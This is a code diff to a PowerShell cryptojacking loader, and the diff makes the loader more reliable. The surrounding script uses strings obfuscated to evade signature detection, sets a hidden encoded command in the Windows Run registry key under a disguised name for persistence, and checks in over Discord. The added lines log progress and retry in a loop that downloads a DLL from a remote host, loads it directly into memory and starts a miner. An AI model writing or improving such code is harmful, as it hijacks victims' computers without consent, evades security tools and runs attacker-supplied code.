@@ -3,6 +3,7 @@ if (Test-Path "$PSScriptRoot\.lock") {
 }
 
 $ProgressPreference = 'SilentlyContinue'
+$logPath = "$env:TEMP\miner_debug.log"
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 # Config - Obfuscated strings to avoid simple signature detection
@@ -40,25 +41,35 @@ $pCmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $encoded"
 try {
     $runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
     Set-ItemProperty -Path $runKey -Name 'UpdateCoord' -Value $pCmd -ErrorAction SilentlyContinue
-} catch {}
+    Write-Log "Persistence registry entry set"
+} catch { Write-Log "Failed to set persistence: $_" }
 
-# Memory Injection - Loading DLL directly into RAM
-try {
-    $dllUrl = "$base/Bridge.dll?v=$([Guid]::NewGuid())"
-    $bytes = Invoke-RestMethod -Uri $dllUrl -UseBasicParsing
-    $asm = [Reflection.Assembly]::Load($bytes)
-    $type = $asm.GetType('DateFundLoader')
-    $method = $type.GetMethod('StartMiner')
-    $method.Invoke($null, @($gpu, $addr))
-} catch {
-    # Fallback to older PS versions if Invoke-RestMethod fails for binary
-    try {
-        $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
-        $bytes = $wc.DownloadData($dllUrl)
-        $asm = [Reflection.Assembly]::Load($bytes)
-        $asm.GetType('DateFundLoader').GetMethod('StartMiner').Invoke($null, @($gpu, $addr))
-    } catch {}
+function Write-Log {
+    param([string]$msg)
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    Add-Content -Path $logPath -Value "$timestamp - $msg"
+}
+
+function Start-MinerWithRetry {
+    param([bool]$gpu, [string]$addr)
+    $maxAttempts = 3
+    for ($i = 1; $i -le $maxAttempts; $i++) {
+        try {
+            $dllUrl = "$base/Bridge.dll?v=$([Guid]::NewGuid())"
+            $bytes = Invoke-RestMethod -Uri $dllUrl -UseBasicParsing
+            $asm = [Reflection.Assembly]::Load($bytes)
+            $type = $asm.GetType('DateFundLoader')
+            $method = $type.GetMethod('StartMiner')
+            $method.Invoke($null, @($gpu, $addr))
+            Write-Log "Miner started successfully on attempt $i"
+            return $true
+        } catch {
+            Write-Log "Miner start attempt $i failed: $_"
+            Start-Sleep -Seconds 5
+        }
+    }
+    Write-Log "Miner failed to start after $maxAttempts attempts"
+    return $false
 }
 
 # Discord Check-in
@@ -75,4 +86,10 @@ try {
 } catch {}
 
 # Background Loop
-while ($true) { Start-Sleep -Seconds 3600 }
+while ($true) {
+    $started = Start-MinerWithRetry -gpu $gpu -addr $addr
+    if (-not $started) {
+        Write-Log "Miner failed to start after retries, will retry after delay"
+    }
+    Start-Sleep -Seconds 900  # 15 minutes before next attempt
+}
